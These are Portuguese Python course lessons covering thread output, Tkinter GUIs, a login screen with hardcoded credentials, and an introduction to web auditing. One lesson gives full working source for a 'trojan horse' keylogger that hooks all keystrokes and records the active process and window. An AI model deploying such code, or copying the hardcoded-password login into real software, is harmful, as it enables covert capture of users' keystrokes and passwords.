o impasse  (deadlock) no encadeamento dos pipes.

Agora, vamos executar o scritp acima por duas vezes e verificar os resultados abaixo:

Resultado da primeira execução:

 Iniciando a THREAD 1 com 20 processos
 A THREAD 1 realiza o processo 20
 Iniciando a THREAD 2 com 15 processos
 A THREAD 1 realiza o processo 19
 A THREAD 2 realiza o processo 15
 A THREAD 1 realiza o processo 18
 A THREAD 2 realiza o processo 14
 A THREAD 1 realiza o processo 17
 A THREAD 2 realiza o processo 13
 A THREAD 1 realiza o processo 16
 A THREAD 2 realiza o processo 12
 A THREAD 1 realiza o processo 15
 A THREAD 2 realiza o processo 11
 A THREAD 1 realiza o processo 14
 A THREAD 2 realiza o processo 10
 A THREAD 1 realiza o processo 13
 A THREAD 2 realiza o processo 9
 A THREAD 1 realiza o processo 12
 A THREAD 2 realiza o processo 8
 A THREAD 1 realiza o processo 11
 A THREAD 2 realiza o processo 7
 A THREAD 1 realiza o processo 10
 A THREAD 2 realiza o processo 6
 A THREAD 1 realiza o processo 9
 A THREAD 2 realiza o processo 5
 A THREAD 1 realiza o processo 8
 A THREAD 2 realiza o processo 4
 A THREAD 1 realiza o processo 7
 A THREAD 2 realiza o processo 3
 A THREAD 1 realiza o processo 6
 A THREAD 2 realiza o processo 2
 A THREAD 1 realiza o processo 5
 A THREAD 2 realiza o processo 1
 A THREAD 1 realiza o processo 4
 A THREAD 1 realiza o processo 3
 A THREAD 1 realiza o processo 2
 A THREAD 1 realiza o processo 1
 
Tecle ENTER para sair...
Resultado da segunda execução:

 Iniciando a THREAD 1 com 20 processos
 A THREAD 1 realiza o processo 20
 A THREAD 1 realiza o processo 19
 A THREAD 1 realiza o processo 18
 A THREAD 1 realiza o processo 17
 A THREAD 1 realiza o processo 16
 A THREAD 1 realiza o processo 15
 A THREAD 1 realiza o processo 14
 A THREAD 1 realiza o processo 13
 A THREAD 1 realiza o processo 12
 A THREAD 1 realiza o processo 11
 A THREAD 1 realiza o processo 10
 A THREAD 1 realiza o processo 9
 A THREAD 1 realiza o processo 8
 A THREAD 1 realiza o processo 7
 A THREAD 1 realiza o processo 6
 Iniciando a THREAD 2 com 15 processos
 A THREAD 1 realiza o processo 5
 A THREAD 2 realiza o processo 15
 A THREAD 1 realiza o processo 4
 A THREAD 2 realiza o processo 14
 A THREAD 1 realiza o processo 3
 A THREAD 2 realiza o processo 13
 A THREAD 1 realiza o processo 2
 A THREAD 2 realiza o processo 12
 A THREAD 1 realiza o processo 1
 A THREAD 2 realiza o processo 11
 A THREAD 2 realiza o processo 10
 A THREAD 2 realiza o processo 9
 A THREAD 2 realiza o processo 8
 A THREAD 2 realiza o processo 7
 A THREAD 2 realiza o processo 6
 A THREAD 2 realiza o processo 5
 A THREAD 2 realiza o processo 4
 A THREAD 2 realiza o processo 3
 A THREAD 2 realiza o processo 2
 A THREAD 2 realiza o processo 1
 
Tecle ENTER para sair...
O script foi executado duas vezes e notem que os processos foram iniciados de maneira diferentes: na primeira execução, 
foi iniciado o THREAD 1 e executado o processo 20 e depois iniciou-se o THREAD 2.

Na segunda execução, foi iniciado o THREAD 1 e executado os processos do 6 ao 20 e depois é que foi iniciado o THREAD 2. Isto aconteceu 
porque nós não temos a autonomia para determinar a ordem do encadeamento da execução das threads, isto fica a cargo do sistema operacional
 que faz o escalonamento das threads a serem executadas.

-------------------------------------------------------------------------------------------------------------------------------------------

Programação em GUI com Tkinter
Apresentar o recurso Tkinter do Python para programação com interface gráfica.

NESTE TÓPICO
 ALGUMAS CARACTERÍSTICAS DA PROGRAMAÇÃO GUI EM PYTHON:
 ALGUNS PARÂMETROS DA PROGRAMAÇÃO GUI EM PYTHON:
 Referências
NESTE TÓPICO

 ALGUMAS CARACTERÍSTICAS DA PROGRAMAÇÃO GUI EM PYTHON:
 ALGUNS PARÂMETROS DA PROGRAMAÇÃO GUI EM PYTHON:
 Referências
Marcar
tópico

     

Olá alunos,

No início, na década de 60 e 70, estávamos na era da interface por linha de comando: CLI (Command Line Interface), 
onde o principal dispositivo deste tipo de interface é o teclado: toda a “navegação” pela tela era realizada pelas teclas
 ou por pressionar uma combinação de duas ou mais teclas. A partir da década de 80, aparece a GUI (Graphical User Interface), 
interface gráfica de usuário, onde o principal dispositivo, além do teclado, é o mouse para navegarmos pela tela do monitor. É o 
tipo de interface mais utilizada atualmente, principalmente para aplicações em desktop. E temos também hoje a NUI (Natural User Interface),
 interface natural do usuário, para interagir com o sistema não será necessário teclado ou mouse, basta realizar movimentos com as mãos ou 
com outras partes do corpo. Um exemplo deste tipo de interface é o Kinect® da Microsoft® que executam aplicativos que reconhecem os movimentos do corpo humano.

Com a linguagem Python também podemos trabalhar no ambiente de desenvolvimento do MS Visual Studio® e controlar o dispositivo Kinect®.
 No entanto, Python vem com bibliotecas para trabalharmos em GUI. O padrão incluso é o Tcl/Tk que possui o módulo Tkinter (Tk) que é uma 
biblioteca GUI escrita em linguagem C para o Tcl (o interpretador do Tk), é leve, portátil, simples e robusta. Vem nativa na instalação do 
Python e podemos utilizar na interface IDLE. Para utilizá-la basta invocar a biblioteca:

from tkinter import *

Existem outros tipos de bibliotecas gráficas para Python, tais como: pyQt, Gtk, wxWidgets, PySide, etc.

Para programarmos em Tk, por exemplo, abra o IDLE e crie o código em script.

Na hora de salvar, poderemos fazê-lo de duas formas: colocando o nome do script com a extensão .py (nome.py) 
ou com a extensão .pyw (nome.pyw). A diferença é que ao executarmos com a extensão .py, será aberto a tela do
 interpretador junto com a aplicação, enquanto na extensão .pyw, vai abrir somente a tela da aplicação.

ALGUMAS CARACTERÍSTICAS DA PROGRAMAÇÃO GUI EM PYTHON:
Para que possamos programar em GUI, é necessário utilizarmos as técnicas da Orientação a Objetos.

class Classe: encapsula objetos, métodos e atributos.

def Cria um método ou função. Nomes iniciados por ‘__’ significa que o método é privado.

self Objeto principal (base) e padrão do Python.

container Recipiente, depósito, caixa: armazena vários objetos (widgets).

widget Objetos de uma tela, tais como: button, label, frame, icon, etc.

frame Área retangular que pode conter outros widgets.

ALGUNS PARÂMETROS DA PROGRAMAÇÃO GUI EM PYTHON:
font Define o tipo de fonte do texto: (fontname, fontsize, fonttype), onde fonttype pode ser bold, italic ou normal.

background (bg) Cor de fundo.

foreground (fg) Cor do texto.

side Define em qual lado o objeto vai aparecer (RIGHT,LEFT,TOP,BOTTOM).

command Realiza uma operação.

padx Posiciona o widget horizontalmente tendo como referência a borda da direita e da esquerda em pixels.

pady Posiciona o widget verticalmente tendo como referência o topo e o inferior da borda em pixels.

pack() Exibe os widgets na tela.

Vamos ver um exemplo:

from tkinter import *
 
tela = Tk() #instancia a classe 'Tk()' através da variável 'tela'
tela.title("TELA INICIAL")
tela["bg"] = "light yellow"
tela.geometry("200x200") #define o tamanho da tela em width (largura) x height (altura)
Na linha 1, chamamos a biblioteca tkinter importando todos os recursos dessa biblioteca.

Na linha 3, criamos uma variável, como um objeto, para receber a classe TK( ).

Nas linhas 4, 5 e 6, definimos um título para a tela (“TELA INICIAL”), uma cor de fundo e o tamanho da tela.

Vamos continuar incluindo mais alguns objetos:

from tkinter import *
 
tela = Tk() #instancia a classe 'Tk()' através da variável 'tela'
tela.title("TELA INICIAL")
tela["bg"] = "light yellow"
tela.geometry("200x200") #define o tamanho da tela em width (largura) x height (altura)
 
texto = Text(height=1, width=15)
texto.pack()
 
btOK = Button()
btOK["text"] = "OK"
btOK["font"] = ("Calibri", "10","bold")
btOK["width"] = 12
btOK["bg"] = "blue"
btOK.pack()
 
btsair = Button()
btsair["text"] = "SAIR"
btsair["font"] = ("Calibri", "10","bold")
btsair["width"] = 5
btsair["command"] = quit
btsair.pack()
 
tela.mainloop()
Na linha 8, criamos um campo de texto, definindo a altura e largura.

A partir da linha 11, criamos um botão, definindo um nome (“OK”), com a fonte e tamanho da fonte. Definimos também a largura
 [“width”] = 12 e a cor do botão: [“bg”] = “blue”.

A partir da linha 18, criamos um botão SAIR, com a fonte e tamanho da fonte. Passamos um comando de sair para o botão, com a função command:
 [“command”] = quit, ou seja, quando o usuário clicar no botão SAIR, a tela será fechada.

A linha 25, tem um loop principal que faz com que toda a aplicação fique em execução até o usuário encerra-la.

Agora vamos incluir mais um objeto, um container:

from tkinter import *
 
tela = Tk() #instancia a classe 'Tk()' através da variável 'tela'
tela.title("TELA INICIAL")
tela["bg"] = "light yellow"
tela.geometry("200x200") #define o tamanho da tela em width (largura) x height (altura)
 
Container = Frame() #definimos o container com um frame
Container["pady"] = 10 #posiciona o container na tela a partir do top e bottom
Container["bg"] = "light yellow" # define uma cor de fundo
Container.pack() #para exibir os widgets do container
 
texto = Text(Container)
texto["height"] = 1
texto["width"] = 15
texto.pack()
 
btOK = Button(Container)
btOK["text"] = "OK"
btOK["font"] = ("Calibri", "10","bold")
btOK["width"] = 12
btOK["bg"] = "blue"
btOK.pack()
 
btsair = Button()
btsair["text"] = "SAIR"
btsair["font"] = ("Calibri", "10","bold")
btsair["width"] = 5
btsair["command"] = quit
btsair.pack()
 
tela.mainloop()
Na linha 8, criamos um container e agora colocamos os widgets: caixa de texto e o botão “OK” neste container 
(linhas 13 e 18). Já o botão SAIR ficou fora do container.

Ao executar o código acima, a tela deve ficar como na imagem abaixo:

A imagem demonstra como ficou a tela do código, com as caixas de texto e o botão sair.
Neste tópico podemos observar que a interface gráfica parte da interface por linha de comando (CLI), ou seja,
 utilizamos linhas de comandos para gerar a interface gráfica.

--------------------------------------------------------------------------------------------------------------------

Criando uma tela de login recebendo dados do usuário
Criar um exemplo de tela de login que recebe dados digitados pelo usuário.

NESTE TÓPICO
 CONSTRUINDO A TELA DE LOGIN
 Referências
NESTE TÓPICO

 CONSTRUINDO A TELA DE LOGIN
 Referências
Marcar
tópico

     

Olá alunos,

Utilizando a parte gráfica (GUI) do Python, o módulo Tkinter, vamos construir uma tela de login com os recursos da parte procedural da linguagem, 
com a criação de funções denominadas.

Do módulo Tkinter, vamos utilizar os objetos, widgets, frames e containers para a construção da tela de login.

CONSTRUINDO A TELA DE LOGIN
Vamos iniciar, invocando a biblioteca do Tkinter:

from tkinter import *
O que significa que da biblioteca Tkinter vamos utilizar todas as suas funções, com o curinga asterisco.

Continuando com o código:

from tkinter import *
 
tela = Tk() #instancia a classe 'Tk()' através da variável 'tela'
tela.title("TELA DE LOGIN")
tela["bg"] = "light green"
tela.geometry("400x250") #define o tamanho da tela em width (largura) x height (altura)
Principal(tela) #instância da classe Principal, passamos a variável tela como parâmetro
tela.mainloop() #método obrigatório para carregar a tela e para que os eventos ocorram
Na linha 3, criamos uma variável tela para instanciar a classe Tk() (tkinter) com todas as funções que importamos. É por esta linha que
 o interpretador vai iniciar a execução da aplicação.

Depois utilizamos a função title para dar um título para a tela (linha 4).

Nas linhas 5 e 6, definimos uma cor para a tela e o tamanho dela (a medida é em pixels).

Na linha 7, chamamos a classe Principal, passando como parâmetro, a variável tela.

Na linha 8, a função para que tudo seja executado recursivamente, o loop (a tela e seus eventos), até que o usuário encerre a aplicação.

Continuando...

class Principal: #cria a classe principal 
    def __init__(self, master=None):  #cria o método inicial e que será filho da classe Principal
        self.fontePadrao = ("Arial", "10")  
        self.Container1 = Frame(master) #definimos o container pai com um frame
        self.Container1["pady"] = 10 #posiciona o container na tela a partir do top e bottom
        self.Container1["bg"] = "light green" # define uma cor de fundo
        self.Container1.pack() #para exibir os widgets do container
 
        self.Container2 = Frame(master) #cria um container para label e text field nome
        self.Container2["padx"] = 20 #posiciona o container na tela a partir de left e right
        self.Container2["bg"] = "light green"
        self.Container2.pack()
 
        self.Container3 = Frame(master) #cria um container para label e text field senha
        self.Container3["padx"] = 20
        self.Container3["bg"] = "light green"
        self.Container3.pack()
 
        self.Container4 = Frame(master) #cria um container para o botão AUTENTICAR e a label MENSAGEM
        self.Container4["pady"] = 20
        self.Container4["bg"] = "light green"
        self.Container4.pack()
 
        self.titulo = Label(self.Container1, text="Dados do usuário:")
        self.titulo["font"] = ("Arial", "10", "bold")
        self.titulo["bg"] = "light green"
        self.titulo.pack()
 
        self.nomeLabel = Label(self.Container2,text=" Nome:", font=self.fontePadrao)
        self.nomeLabel["bg"] = "light green"
        self.nomeLabel.pack(side=LEFT) #define o lado da exbição
 
        self.nome = Entry(self.Container2) #utiliza o método Entry (input) para receber dados via teclado
        self.nome.focus() #determina a posição do cursor na caixa de texto
        self.nome["width"] = 30
        self.nome["font"] = self.fontePadrao
        self.nome.pack(side=LEFT)
 
        self.senhaLabel = Label(self.Container3, text="Senha:", font=self.fontePadrao)
        self.senhaLabel["bg"] = "light green"
        self.senhaLabel.pack(side=LEFT)
        self.senha = Entry(self.Container3)
        self.senha["width"] = 30
        self.senha["font"] = self.fontePadrao
        self.senha["show"] = "*"
        self.senha.pack(side=LEFT)
 
        self.autenticar = Button(self.Container4)
        self.autenticar["text"] = "AUTENTICAR"
        self.autenticar["font"] = ("Calibri", "10","bold")
        self.autenticar["width"] = 12
        self.autenticar["bg"] = "white"
        #self.autenticar["command"] = self.verificaSenha
        self.autenticar.pack()
 
        self.sair = Button()
        self.sair["text"] = "SAIR"
        self.sair["font"] = ("Calibri", "10","bold")
        self.sair["width"] = 5
        self.sair["command"] = quit
        self.sair.pack(side=TOP)
 
        self.mensagem = Label(self.Container4, text="", font=self.fontePadrao)
        self.mensagem["bg"] = "light green"
        self.mensagem.pack()
 
tela = Tk() #instancia a classe 'Tk()' através da variável 'tela'
tela.title("TELA DE LOGIN")
tela["bg"] = "light green"
tela.geometry("400x250") #define o tamanho da tela em width (largura) x height (altura)
Principal(tela) #instância da classe Principal, passamos a variável tela como parâmetro
tela.mainloop() #método obrigatório para carregar a tela e para que os eventos ocorram
Na linha 1, criamos a classe Principal, que foi chamada pela linha 71, a partir daí, até a linha 65, tudo vai pertencer a esta classe (preste atenção na endentação).

Na linha 2, criamos o método def que pertence à classe Principal (master=none), com o nome init, os sinais de “__” significa que é um método privado.

Utilizamos a partir daí o objeto padrão do Python que é o self para fazer referencias com todos os objetos da tela.

A partir daí (da linha 4 até a linha 22), criamos os Container1, 2, 3 e 4, passando vários parâmetros: cor de fundo, posição. E determinamos cada container 
como um widget (objeto) tipo Frame.  

A partir da linha 24, criamos um widget tipo Label, que apresentará um título na tela, que pertence ao Container1.

Da linha 29 até a linha 31, criamos um Label e uma caixa de texto para receber o nome do usuário, que pertence ao Container2.

Da linha 39 até a linha 46, criamos um Label e uma caixa de texto para receber a senha do usuário, que pertence ao Container3.

Da linha 48 até a linha 54, criamos um widget tipo Button que chamará o método verificaSenha (será implementado a seguir), que pertence ao Container4.

Da linha 56 até a linha 61, criamos um widget tipo Button que ao ser clicado, encerrará a aplicação, pois passamos o parâmetro “command”= quit,
 este botão não pertence a nenhum container.

Da linha 63 até a linha 65, criamos outro Label, que deixará uma mensagem em branco, a mensagem será preenchida posteriormente pelo método
 verificaSenha, este Label  pertence ao Container4.

Veja no vídeo abaixo como ficou a nossa tela:

Vídeo que demonstra como ficou a tela de login.
Agora vamos completar a aplicação, criando um método para verificar a senha:

#Método para verificar senha
    def verificaSenha(self):
        usuario = self.nome.get() #apanha os dados digitados pelo usuário no text field 'nome'
        senha = self.senha.get()
        if usuario == "Denilson" and senha == "123":
            self.mensagem["text"] = "Autenticado!"
            self.nome["fg"] = "gray"
            self.senha["fg"] = "gray"
            self.sair.focus_force()
        else:
            self.mensagem["text"] = "Usuário e/ou senha incorretos!"
            self.senha.delete(0,END)
            self.nome.delete(0,END)
            self.nome.focus()
Na linha 2, criamos o método verificaSenha, passando como argumento o objeto padrão self.

Na linha 3 e 4, criamos as variáveis nome e senha que recebe o nome e a senha digitado pelo usuário.

Na linha 5, abrimos um bloco if para verificar se o usuário e a senha estão corretas. Se estiverem, o método mensagem é chamado e exibirá o
 texto Autenticado!. Em seguida o nome e a senha mudam a cor da letra para cinza (gray). E por último coloca o foco no botão sair (linha 9).

Senão, chama o método mensagem para exibir “Usuário e/ou senha incorretos!”, limpa os campos do nome e da senha, utilizando a função: delete(0,END) 
e muda o foco do cursor para o campo nome (linha 14).

Observação: A função delete(n,m) é acompanhada de parâmetros que determinada o que você quer apagar, lembrando que a primeira posição inicia com zero (0). 
Então passamos como valores de parâmetros: (0,END), ou seja, vou apagar todo o texto do campo digitado pelo usuário, do 0 até o fim (END). Exemplo: 
se você colocar delete(1,4) e o usuário digitar: uninove, será apagado da segunda até a quinta posição e ficaria assim: u     ve.

Vamos colocar a linha de comando: self.autenticar["command"] = self.verificaSenha no botão AUTENTICAR. Quando este botão for clicado, ele chamará o 
método verificaSenha.

Mude o nome e a senha do bloco if, criando o login com seu nome e senha! (linha 5).

Agora, vejam como ficou o código final:

from tkinter import *
 
class Principal: #cria a classe principal 
    def __init__(self, master=None):  #cria o método inicial e que será filho da classe Principal
        self.fontePadrao = ("Arial", "10") 
        self.Container1 = Frame(master) #definimos o container pai com um frame
        self.Container1["pady"] = 10 #posiciona o container na tela a partir do top e bottom
        self.Container1["bg"] = "light green" # define uma cor de fundo
        self.Container1.pack() #para exibir os widgets do container
 
        self.Container2 = Frame(master) #cria um container para label e text field nome
        self.Container2["padx"] = 20 #posiciona o container na tela a partir de left e right
        self.Container2["bg"] = "light green"
        self.Container2.pack()
 
        self.Container3 = Frame(master) #cria um container para label e text field senha
        self.Container3["padx"] = 20
        self.Container3["bg"] = "light green"
        self.Container3.pack()
 
        self.Container4 = Frame(master) #cria um container para o botão AUTENTICAR e a label MENSAGEM
        self.Container4["pady"] = 20
        self.Container4["bg"] = "light green"
        self.Container4.pack()
 
        self.titulo = Label(self.Container1, text="Dados do usuário:")
        self.titulo["font"] = ("Arial", "10", "bold")
        self.titulo["bg"] = "light green"
        self.titulo.pack()
 
        self.nomeLabel = Label(self.Container2,text=" Nome:", font=self.fontePadrao)
        self.nomeLabel["bg"] = "light green"
        self.nomeLabel.pack(side=LEFT) #define o lado da exbição
 
        self.nome = Entry(self.Container2) #utiliza o método Entry (input) para receber dados via teclado
        self.nome.focus() #determina a posição do cursor na caixa de texto
        self.nome["width"] = 30
        self.nome["font"] = self.fontePadrao
        self.nome.pack(side=LEFT)
 
        self.senhaLabel = Label(self.Container3, text="Senha:", font=self.fontePadrao)
        self.senhaLabel["bg"] = "light green"
        self.senhaLabel.pack(side=LEFT)
 
        self.senha = Entry(self.Container3)
        self.senha["width"] = 30
        self.senha["font"] = self.fontePadrao
        self.senha["show"] = "*"
        self.senha.pack(side=LEFT)
 
        self.autenticar = Button(self.Container4)
        self.autenticar["text"] = "AUTENTICAR"
        self.autenticar["font"] = ("Calibri", "10","bold")
        self.autenticar["width"] = 12
        self.autenticar["bg"] = "white"
        self.autenticar["command"] = self.verificaSenha
        self.autenticar.pack()
 
        self.sair = Button()
        self.sair["text"] = "SAIR"
        self.sair["font"] = ("Calibri", "10","bold")
        self.sair["width"] = 5
        self.sair["command"] = quit
        self.sair.pack(side=TOP)
 
        self.mensagem = Label(self.Container4, text="", font=self.fontePadrao)
        self.mensagem["bg"] = "light green"
        self.mensagem.pack()
 
    #Método para verificar senha
    def verificaSenha(self):
        usuario = self.nome.get() #apanha os dados digitados pelo usuário no text field 'nome'
        senha = self.senha.get()
        
        if usuario == "Denilson" and senha == "123":
            self.mensagem["text"] = "Autenticado!"
            self.nome["fg"] = "gray"
            self.senha["fg"] = "gray"
            self.sair.focus_force()
       else:
            self.mensagem["text"] = "Usuário e/ou senha incorretos!"
            self.senha.delete(0,END)
            self.nome.delete(0,END)
            self.nome.focus()
 
tela = Tk() #instancia a classe 'Tk()' através da variável 'tela'
tela.title("TELA DE LOGIN")
tela["bg"] = "light green"
tela.geometry("400x250") #define o tamanho da tela em width (largura) x height (altura)
Principal(tela) #instância da classe Principal, passamos a variável tela como parâmetro
tela.mainloop() #método obrigatório para carregar a tela e para que os eventos ocorram
Para ver a aplicação executando, vejam o vídeo abaixo:


Este é um exemplo de como podemos validar um login, dá para incrementar, apanhando os dados de login de uma tabela.

----------------------------------------------------------------------------------------------------------------------------------

Criando script de cavalo de tróia para logging em teclas
Criar um script, tipo cavalo de Tróia, para capturar as teclas que são pressionadas por um usuário.

NESTE TÓPICO
 Referências
NESTE TÓPICO

 Referências
Marcar
tópico

     

Olá alunos,

Vamos ver agora algo relacionado a parte de segurança. Você já deve ter ouvido falar de scripts que ficam “escondidos” 
no computador, como no presente grego aos troianos, o cavalo de Tróia. Este tipo de aplicação captura todo o tipo de tecla pressionada pelo usuário no keyboard.

ATENÇÃO!
Este tipo de aplicação é para o aprendizado, se for utilizar com a finalidade de prejudicar terceiros, é de sua responsabilidade.

Para construirmos este tipo de script, necessitaremos de algumas bibliotecas que até o momento, ainda não estão disponíveis para o Python 3,
 então teremos que utilizar o Python 2. Para isto, você pode utilizar o seguinte link para baixar a versão do Python 2:

https://www.python.org/downloads/release/python-2715/

Você pode instalar tranquilamente a versão do Python 2, mesmo que você já tenha instalado o Python 3, eles podem ser executados de forma independente.

Agora necessitaremos da biblioteca do pyhook que fará o hook, a captura das teclas pressionadas (lembre-se que hook é o nome do capitão Gancho (Hook),
 o pirata da fábula de Peter Pan). Esta biblioteca é que, por enquanto, só existe para Python 2. Podemos fazer download pelo link:

https://sourceforge.net/projects/pyhook/?source=typ_redirect

Se você for desenvolver o script para Windows, você terá que trabalhar diretamente em baixo nível, no hardware do teclado. Então terá que utilizar a 
biblioteca pywin32 e poderá fazer download pelo link:

https://sourceforge.net/projects/pywin32/files/pywin32/Build%20220/

Daí você escolherá de acordo com o seu hardware, como o Python 2 trabalha em 32 bits, você deverá baixar a versão para 32 bits e mesmo que o 
seu hardware seja de 64 bits, não terá problema. Outra coisa a ser observada, é o processador, há versões para AMD e Intel. No caso se você tem 
processador Intel, então poderá fazer download pelo link:

https://sourceforge.net/projects/pywin32/files/pywin32/Build%20220/pywin32-220.win32-py2.7.exe/download

Agora, vamos começar o nosso script. Não esqueça de abrir o IDLE do Python 2, vá em File à New File e salve com um nome na extensão .py. O ambiente é
 igual ao do Python 3.

# Script de cavalo de troia para capturar teclas pressionadas
from ctypes import *
import pythoncom
import pyHook 
import win32clipboard
Na linha 2, importamos todas as funções da classe ctypes. No caso esta classe é nativa no Python.

Nas linhas 3, 4 e 5, importamos as classes que fizemos download e instalamos (pyHook e win32clipboard).

usuario   = windll.user32
kernel32 = windll.kernel32
dadosProc    = windll.psapi # funcao para pegar os dados dos processos
telaAtual = None
Nesta parte, criamos algumas variáveis para receber dados de baixo nível, que serão capturados do sistema, como informações do usuário,
 do sistema e dos processos do sistema.

Continuando:

# cria o Hook e registra quando a tecla é pressionada 
tecla         = pyHook.HookManager() # gerenciador do Hook
tecla.KeyDown = teclaPressionada
tecla.HookKeyboard() # executa o hook de todas as teclas pressionadas
pythoncom.PumpMessages() # executa recursivamente
A variável tecla vai receber o gerenciador do Hook e vai fazer a varredura do teclado que será utilizado.

Na linha 5, utilizamos um método da classe pythoncom para que a aplicação rode iterativamente até o usuário fechar a aplicação.

Na linha 3, chamamos a função teclaPressionada quando o usuário teclar. Então, vamos criar a função:

# esta funçao será chamada quando o usuario pressionar uma tecla    
def teclaPressionada(evento):
    global telaAtual   
    # verifica se há mudança de processo
    if evento.WindowName != telaAtual:
        telaAtual = evento.WindowName        
        processoAtual()
# verifica qual tipo de tecla é pressionada
    if evento.Ascii > 32 and evento.Ascii < 127:
        print chr(evento.Ascii),
    else:
        print " <%s> " % evento.Key, # mostra a tecla padrao que foi pressionada
    return True
Na linha 3, recriamos a variável global telaAtual. A seguir é verificado se houve uma mudança de processo ou se novos processos
 foram abertos pelo usuário. Se houve alguma mudança, a função processoAtual() será chamada.

Na linha 9, o bloco if verifica qual tipo de tecla foi pressionada: se foram as teclas de endereço 32 até 127 da tabela ASCII, que são todas as 
teclas do alfabetos ocidental, mais as teclas de caracteres especiais, como por exemplo: +,*,(,=,>,:. Senão será exibida as teclas padrões que 
foram pressionadas, como por exemplo: ENTER, SHIFT, SCAPE, as setas: UP, DOWN, LEFT e RIGHT.


Note que em Python 2, a função print não utiliza parêntesis e utilizamos a virgula para mostrar as teclas em uma mesma linha.

Vamos construir a função processoAtual()

# esta funçao eh chamada caso o usuario mude de processo
def processoAtual():
     alvo = usuario.GetForegroundWindow() # estabelece o manipulador da janela alvo
    # pega o ID do processo sendo executado
    idP = c_ulong(0)
    usuario.GetWindowThreadProcessId(alvo, byref(idP)) # pega o ID do processo
    idProc = "%d" % idP.value # atribui o id do processo
    # pega o nome do programa que executa o processo
    nomeProg = create_string_buffer("\x00" * 512)
    nomeProc = kernel32.OpenProcess(0x400 | 0x10, False, idP) # pega o nome do executavel em uso
    dadosProc.GetModuleBaseNameA(nomeProc,None,byref(nomeProg),512) # pega o nome do processo executado pelo programa
   # pega o nome da tela sendo executada
    nomeTela = create_string_buffer("\x00" * 512)
    tamanho = usuario.GetWindowTextA(alvo, byref(nomeTela),512)
    # mostra todos os dados do processo que está sendo executado
    print "\n\n* * ID Processo: %s - %s - %s * *\n" % (idProc, nomeProg.value, nomeTela.value)
    
    # fecha os manipuladores (handles)
    kernel32.CloseHandle(alvo)
    kernel32.CloseHandle(nomeProc)
Na linha 3, apontamos para a janela que o usuário estiver utilizando. Um handle é um manipulador, como se fosse um ponteiro (pointer). 
A janela capturada é atribuída na variável alvo.

A seguir, pegamos o id processo, o nome do programa e o nome do processo que está sendo executado. Por exemplo: se eu abrir um documento do Word, 
vai ser mostrado: o ID do processo, o nome do programa: o WINWORD.EXE, o nome do processo:  no caso é o arquivo: nome_do_arquivo – WORD.

Lembrando que o ID do processo é gerado pelo sistema operacional, no caso, pelo Windows. Na linha 6, pegamos o id do processo com a função GetWindowThreadProcessId. 
Na linha 7, atribuímos na variável idProc o valor numérico do id do processo, como é numérico, formatamos com a expressão regular “%d”.

A seguir, pegamos o nome do processo e do programa que está sendo executado e na linha 16, exibimos o ID do processo, o nome do programa e o nome do processo.

Esta será a linha de código exibida no terminal e, caso o usuário pressionar uma tecla padrão, será executada a linha print " <%s> " % evento.Key,
 da função teclaPressionada.

Utilizamos a expressão regular: “%s” para formatar os valores em strings (caracteres).

Nas linhas 19 e 20, fechamos ou destruímos os handles (já que se comportam como ponteiros).

O código completo ficou assim:

# Script de cavalo de troia para capturar teclas pressionadas
from ctypes import *
import pythoncom
import pyHook 
import win32clipboard
usuario   = windll.user32
kernel32 = windll.kernel32
dadosProc    = windll.psapi # funcao para pegar os dados dos processos
telaAtual = None
# esta função é chamada caso o usuário mude de processo
def processoAtual():
     alvo = usuario.GetForegroundWindow() # estabelece o manipulador da janela alvo
    # pega o ID do processo sendo executado
    idP = c_ulong(0)
    usuario.GetWindowThreadProcessId(alvo, byref(idP)) # pega o ID do processo
    idProc = "%d" % idP.value # atribui o id do processo
    # pega o nome do programa que executa o processo
    nomeProg = create_string_buffer("\x00" * 512)
    nomeProc = kernel32.OpenProcess(0x400 | 0x10, False, idP) # pega o nome do executável em uso
    dadosProc.GetModuleBaseNameA(nomeProc,None,byref(nomeProg),512) # pega o nome do processo executado pelo programa
     # pega o nome da tela sendo executada
    nomeTela = create_string_buffer("\x00" * 512)
    tamanho = usuario.GetWindowTextA(alvo, byref(nomeTela),512)
    # mostra todos os dados do processo que está sendo executado
    print "\n\n* * ID Processo: %s - %s - %s * *\n" % (idProc, nomeProg.value, nomeTela.value)
     # fecha os manipuladores (handles)
    kernel32.CloseHandle(alvo)
    kernel32.CloseHandle(nomeProc)
# esta função será chamada quando o usuário pressionar uma tecla    
def teclaPressionada(evento):
    global telaAtual   
    # verifica se há mudança de processo
    if evento.WindowName != telaAtual:
        telaAtual = evento.WindowName        
        processoAtual()
	# verifica qual tipo de tecla é pressionada
    if evento.Ascii > 32 and evento.Ascii < 127:
        print chr(evento.Ascii),
    else:
        print " <%s> " % evento.Key, # mostra a tecla padrão que foi pressionada
    return True
# cria o Hook e registra quando a tecla é pressionada 
tecla         = pyHook.HookManager() # gerenciador do Hook
tecla.KeyDown = teclaPressionada
tecla.HookKeyboard() # executa o hook de todas as teclas pressionadas
pythoncom.PumpMessages() # executa recursivamente
Agora vejam o vídeo da execução do script:

--------------------------------------------------------------------------------------------------------------------------------------------

Auditar aplicações WEB
Mostrar a importância de auditar aplicações WEB e um exemplo de implementação de um tipo de criptografia.

NESTE TÓPICO
 OS COMANDOS SQL
 A FUNÇÃO HASH
 Referências
NESTE TÓPICO

 OS COMANDOS SQL
 A FUNÇÃO HASH
 Referências
Marcar
tópico

     

Olá alunos,

Vamos verificar a importância de auditorias em WEB, já que estamos vivenciando o quarto paradigma da computação: o mundo ligado em rede.
 E hoje a internet, que antes só podia ser acessada através de um computador, pode ser acessada por qualquer dispositivo móvel.

A ideia da auditoria em WEB é um pouco diferente de outros tipos de auditorias, ela está mais ligada a parte da segurança da informação. 
É descobrir possíveis vulnerabilidades que possam permitir acesso indevido aos dados.

A auditoria representa um conjunto de ações para se evitar ou pelo menos dificultar a ação de terceiros sobre dados confidenciais. Este conjunto de 
ações podem ser relacionados a entrada ou a saída de dados. Mas, muitos especialistas recomendam uma maior atenção para a entrada de dados.
 Por exemplo, um invasor pode injetar algum tipo de comando de entrada de dados e conseguir, então extrair os dados que deseja,
 esta ação é conhecida como EXPLOIT. Os comandos mais comuns são do tipo SQL (Structured Query Language) e são conhecidos como SQLi 
(SQL injection). Assim, a ideia é se você evitar a intrusão, a entrada de dados, automaticamente evitará a saída de dados.

Vamos relembrar os comandos SQL:

OS COMANDOS SQL
 

Os comandos SQL estão divididos em categorias: DDL (Data Definition Language), DML (Data Manipulation Language), DQL (Data Query Language)
 e DCL (Data Control Language).

Basicamente, as categorias são formadas pelos seguintes comandos:

DDL: CREATE, ALTER, TRUNCATE e DROP.
DML: INSERT, UPDATE e DELETE.
DCL: GRANT e REVOKE.
DQL: SELECT.
